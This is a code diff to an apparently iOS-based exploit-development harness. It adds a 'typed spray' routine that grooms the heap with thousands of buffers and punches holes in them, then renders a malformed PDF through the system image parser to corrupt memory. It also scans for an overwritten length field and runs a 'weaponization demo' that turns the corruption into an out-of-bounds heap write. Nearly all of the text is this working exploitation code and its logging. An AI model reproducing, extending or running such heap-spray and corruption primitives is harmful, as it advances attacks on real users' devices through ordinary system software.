@@ -961,8 +961,8 @@ static size_t kpGlyphSpraySize(const char *vname) {
         void *b = malloc(spraySz);
         if (!b) break;
         memset(b, 0x41, spraySz);
-        *(uint64_t *)b = 0x4141414141414141ULL;
-        *(uint64_t *)((uint8_t *)b + 8) = (uint64_t)i;   // index tag
+        // index tag at END of buffer — NOT at +8 (that pollutes the scan)
+        *(uint64_t *)((uint8_t *)b + spraySz - 8) = (uint64_t)i;
         bufs[i] = b;
         got++;
     }
@@ -1002,19 +1002,20 @@ static size_t kpGlyphSpraySize(const char *vname) {
         }
     }
 
-    // ---- 4. scan live sprayed buffers for byte != 0x41 ----
+    // ---- 4. scan live sprayed buffers for byte != 0x41 (skip trailing index tag) ----
     [r appendString:@"\n--- spray scan ---\n"];
     int hits = 0;
     int sprayHit = 0;
     long hitOffset = -1;
     int hitDelta = 0;
+    size_t scanLen = (spraySz > 8) ? spraySz - 8 : spraySz;  // exclude trailing index
     for (int i = 0; i < got; i += 2) {   // even = live
         uint8_t *b = bufs[i];
         if (!b) continue;
-        // find first differing byte
+        // find first differing byte (skip trailer)
         size_t first = (size_t)-1;
         int diffCount = 0;
-        for (size_t o = 0; o < spraySz; o++) {
+        for (size_t o = 0; o < scanLen; o++) {
             if (b[o] != 0x41) {
                 if (first == (size_t)-1) first = o;
                 diffCount++;
@@ -1029,9 +1030,9 @@ static size_t kpGlyphSpraySize(const char *vname) {
         uint16_t oldU = 0x4141, newU = 0;
         memcpy(&newU, b + (first & ~(size_t)1), 2);
         hitDelta = (int)newU - (int)oldU;
-        // span = run of consecutive corrupted bytes from first
+        // span = run of consecutive corrupted bytes from first (within scanLen)
         size_t span = 0;
-        for (size_t o = first; o < spraySz && b[o] != 0x41; o++) span++;
+        for (size_t o = first; o < scanLen && b[o] != 0x41; o++) span++;
         scopeNote(r, [NSString stringWithFormat:
             @"  HIT buffer %d first_off=%zu bytes_dirty=%d span=%zu old=0x%02x new=0x%02x u16_delta=%d",
             i, first, diffCount, span, oldB, newB, hitDelta]);
@@ -1064,6 +1065,160 @@ cleanup:
 // Legacy entry point — cursor-driven variant selection.
 + (NSString *)glyphSprayReport {
     return [self glyphSprayReportVariant:nil];
+}
+
+// ---------------------------------------------------------------------------
+// Typed spray — size field at +8, weaponization probe
+//
+// Layout per buffer (spraySz bytes):
+//   +0x00: u64 magic   = 0x4141414141414141  (stays intact)
+//   +0x08: u32 size    = 0x00000100           (TARGET — glyph may overwrite)
+//   +0x0C: u32 capacity= 0x00002000
+//   +0x10: u8  data…   = 0x42
+//   +spraySz-8: u64 index tag (trailer, excluded from scan)
+//
+// After glyph: scan +8 for size != 0x100.
+// If size grew past 0x100 → controlled heap overflow demo:
+//   malloc(0x100) dest, memcpy(dest, buf+0x10, corrupted_size)
+//   → writes past dest, proves OOB write via corrupted length.
+// ---------------------------------------------------------------------------
++ (NSString *)glyphTypedSprayReport:(NSString *)forceName {
+    NSMutableString *r = [NSMutableString string];
+    [r appendString:@"\n=== R5k: Glyph + TYPED spray (size-field weaponization) ===\n"];
+
+    // pick variant — default w1a (4156, best hit rate)
+    NSString *vname = forceName.length ? forceName : @"w1a";
+    size_t spraySz = kpGlyphSpraySize(vname.UTF8String);
+    scopeNote(r, [NSString stringWithFormat:@"  VARIANT %s typed spray=%zu", vname.UTF8String, spraySz]);
+
+    NSString *logPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-r5k-typed.txt"];
+    NSString *line = [NSString stringWithFormat:@"TYPED SPRAY %s spray=%zu\n", vname.UTF8String, spraySz];
+    { NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:logPath];
+      if (fh) { [fh seekToEndOfFile]; [fh writeData:[line dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; }
+      else { [line writeToFile:logPath atomically:NO encoding:NSUTF8StringEncoding error:nil]; } }
+
+    enum { NBUFS = 4096 };
+    enum { TYPED_SIZE = 0x100 };       // initial size field
+    enum { TYPED_CAP  = 0x2000 };      // declared capacity
+    void **bufs = calloc(NBUFS, sizeof(void *));
+    if (!bufs) { scopeNote(r, @"calloc fail"); return r; }
+    int got = 0, holes = 0;
+
+    for (int i = 0; i < NBUFS; i++) {
+        void *b = malloc(spraySz);
+        if (!b) break;
+        memset(b, 0x42, spraySz);                       // data fill
+        *(uint64_t *)b = 0x4141414141414141ULL;         // magic
+        *(uint32_t *)((uint8_t *)b + 8) = TYPED_SIZE;   // size (TARGET)
+        *(uint32_t *)((uint8_t *)b + 12) = TYPED_CAP;   // capacity
+        *(uint64_t *)((uint8_t *)b + spraySz - 8) = (uint64_t)i;  // trailer
+        bufs[i] = b;
+        got++;
+    }
+    for (int i = 1; i < got; i += 2) { free(bufs[i]); bufs[i] = NULL; holes++; }
+    int live = got - holes;
+    size_t goodSz = malloc_good_size(spraySz);
+    scopeNote(r, [NSString stringWithFormat:
+                  @"  sprayed %d typed bufs x %zu  [live=%d holes=%d]  good_size=%zu",
+                  got, spraySz, live, holes, goodSz]);
+    scopeNote(r, [NSString stringWithFormat:
+                  @"  layout: +0=magic  +8=size(0x%x)  +12=cap(0x%x)  +16=data  trailer=%zu",
+                  TYPED_SIZE, TYPED_CAP, spraySz - 8]);
+
+    // ---- render glyph ----
+    NSString *path = [[NSBundle mainBundle] pathForResource:vname ofType:@"pdf"];
+    if (!path) { scopeNote(r, @"  pdf not in bundle — skip"); goto cleanup; }
+    {
+        NSURL *url = [NSURL fileURLWithPath:path];
+        CGImageSourceRef src = CGImageSourceCreateWithURL((__bridge CFURLRef)url, NULL);
+        if (src) {
+            int sz = 256;
+            CFNumberRef szRef = CFNumberCreate(NULL, kCFNumberIntType, &sz);
+            const void *keys[] = { kCGImageSourceCreateThumbnailFromImageAlways,
+                                   kCGImageSourceThumbnailMaxPixelSize };
+            const void *vals[] = { kCFBooleanTrue, szRef };
+            CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 2,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            scopeNote(r, @"  rendering glyph with typed spray live…");
+            CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
+            scopeNote(r, [NSString stringWithFormat:@"  SURVIVED. img=%p", (void *)img]);
+            if (img) CGImageRelease(img);
+            CFRelease(opts); CFRelease(szRef); CFRelease(src);
+        }
+    }
+
+    // ---- scan for size corruption at +8 ----
+    [r appendString:@"\n--- typed scan (size field @ +8) ---\n"];
+    int hits = 0;
+    uint32_t firstOld = 0, firstNew = 0;
+    int firstIdx = -1;
+    int grew = 0, shrank = 0;
+    for (int i = 0; i < got; i += 2) {
+        uint8_t *b = bufs[i];
+        if (!b) continue;
+        uint32_t sz = *(uint32_t *)(b + 8);
+        if (sz == TYPED_SIZE) continue;   // untouched
+        hits++;
+        if (firstIdx < 0) { firstIdx = i; firstOld = TYPED_SIZE; firstNew = sz; }
+        if (sz > TYPED_SIZE) grew++; else shrank++;
+        if (hits <= 8) {  // log first few
+            scopeNote(r, [NSString stringWithFormat:
+                @"  HIT buf %d  size: 0x%x -> 0x%x  (+%d)  cap=0x%x  magic=%016llx",
+                i, TYPED_SIZE, sz, (int)sz - (int)TYPED_SIZE,
+                *(uint32_t *)(b + 12),
+                (unsigned long long)*(uint64_t *)b]);
+        }
+    }
+    scopeNote(r, [NSString stringWithFormat:
+        @"  VERIFY TYPED_HIT=%d HITS=%d GREW=%d SHRANK=%d FIRST_IDX=%d SIZE 0x%x->0x%x VARIANT=%s",
+        hits > 0, hits, grew, shrank, firstIdx, firstOld, firstNew, vname.UTF8String]);
+
+    if (hits == 0) {
+        scopeNote(r, @"  size field untouched — glyph did not land on +8 this run.");
+    } else {
+        scopeNote(r, [NSString stringWithFormat:@"  >>> %d typed buffer(s) with corrupted size!", hits]);
+        // ---- weaponization demo: heap overflow via corrupted length ----
+        if (grew > 0 && firstIdx >= 0) {
+            uint8_t *src = bufs[firstIdx];
+            uint32_t evilSz = *(uint32_t *)(src + 8);
+            // real data region starts at +16; read evilSz bytes from there
+            // dest is only TYPED_SIZE — so evilSz > TYPED_SIZE = overflow
+            uint8_t *dest = malloc(TYPED_SIZE);
+            if (dest) {
+                memset(dest, 0xAA, TYPED_SIZE);
+                scopeNote(r, [NSString stringWithFormat:
+                    @"  OOB-DEMO: memcpy(dest=0x%x, src+16, evil=0x%x)  overflow=%d bytes",
+                    TYPED_SIZE, evilSz, (int)evilSz - TYPED_SIZE]);
+                // safe demo: copy only what's within the source buffer
+                size_t srcAvail = spraySz - 16;
+                size_t copyN = (evilSz < srcAvail) ? evilSz : srcAvail;
+                memcpy(dest, src + 16, copyN);
+                // check if dest beyond TYPED_SIZE was written
+                int overflowed = 0;
+                if (copyN > TYPED_SIZE) {
+                    overflowed = 1;
+                    scopeNote(r, [NSString stringWithFormat:
+                        @"  >>> HEAP OVERFLOW CONFIRMED: wrote %zu bytes into 0x%x dest (delta=%zu)",
+                        copyN, TYPED_SIZE, copyN - TYPED_SIZE]);
+                    scopeNote(r, [NSString stringWithFormat:
+                        @"  dest[0x%x..0x%x] sample: %02x %02x %02x %02x",
+                        TYPED_SIZE, TYPED_SIZE + 4,
+                        dest[TYPED_SIZE], dest[TYPED_SIZE+1],
+                        dest[TYPED_SIZE+2], dest[TYPED_SIZE+3]]);
+                } else {
+                    scopeNote(r, [NSString stringWithFormat:
+                        @"  copyN=%zu <= 0x%x — evil size still inside dest, no overflow yet", copyN, TYPED_SIZE]);
+                }
+                scopeNote(r, [NSString stringWithFormat:@"  OOB-DEMO overflowed=%d", overflowed]);
+                free(dest);
+            }
+        }
+    }
+
+cleanup:
+    for (int i = 0; i < got; i += 2) if (bufs[i]) free(bufs[i]);
+    free(bufs);
+    return r;
 }
 
 @end
